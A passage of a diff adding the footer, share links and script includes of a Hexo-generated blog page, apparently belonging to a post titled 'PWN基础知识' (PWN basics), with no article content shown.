+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/&title=PWN基础知识" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/&title=PWN基础知识" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/&text=PWN基础知识" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN基础知识&body=Check out this article: http://yoursite.com/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
